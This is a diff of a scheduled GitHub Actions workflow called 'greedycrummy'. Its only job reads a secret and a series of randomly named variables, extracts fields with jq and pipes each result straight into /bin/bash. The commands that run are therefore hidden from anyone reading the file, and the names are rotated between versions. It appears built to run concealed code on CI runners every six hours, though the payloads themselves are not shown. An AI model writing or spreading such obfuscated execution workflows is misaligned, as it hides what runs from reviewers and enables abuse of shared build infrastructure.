@@ -1,25 +1,26 @@
 name: greedycrummy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 0/6 * * *'
+    - cron: '30 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: greedycrummy
         env:
-          opzs72: ${{ secrets.opzs72 }}
+          gyiv3: ${{ secrets.gyiv3 }}
         run: |
-          echo $opzs72 | jq -r .e0 | /bin/bash
-          echo $m6 | jq -r .bmzf07 | /bin/bash
-          echo $mnhh20 | jq -r .e54 | /bin/bash
-          echo $ta30542 | jq -r .ntq21 | /bin/bash
-          echo $imlp9181 | jq -r .w33 | /bin/bash
-          echo $xna71 | jq -r .qqb23645 | /bin/bash
-          echo $x5 | jq -r .enb07 | /bin/bash
-          echo $iarg84 | jq -r .lr1663 | /bin/bash
+          echo $gyiv3 | jq -r .wur5958 | /bin/bash
+          echo $d1 | jq -r .q82 | /bin/bash
+          echo $tmto77678 | jq -r .nxag28 | /bin/bash
+          echo $nkter100 | jq -r .qv11 | /bin/bash
+          echo $dccz6593 | jq -r .qwrm01654 | /bin/bash
+          echo $juscs59 | jq -r .ng2984 | /bin/bash
+          echo $oh74 | jq -r .rbux347 | /bin/bash
+          echo $vxde67481 | jq -r .mtk0 | /bin/bash
+          echo $jn93 | jq -r .dw45148 | /bin/bash
+          echo $z08 | jq -r .cw509 | /bin/bash
 
